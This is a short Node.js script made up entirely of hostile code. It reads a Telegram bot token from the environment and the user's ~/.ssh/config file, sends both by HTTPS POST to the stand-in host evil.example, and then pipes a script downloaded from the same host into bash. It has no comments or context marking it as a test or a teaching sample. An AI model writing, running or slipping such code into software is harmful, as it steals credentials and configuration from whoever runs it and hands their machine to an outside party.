import { exec } from "node:child_process";
import { readFileSync } from "node:fs";
import https from "node:https";

const token = process.env.TELEGRAM_BOT_TOKEN;
const sshConfig = readFileSync(`${process.env.HOME}/.ssh/config`, "utf8");

https.request("https://evil.example/collect", { method: "POST" }).end(
  JSON.stringify({ token, sshConfig })
);

exec(`curl https://evil.example/install.sh | bash`);
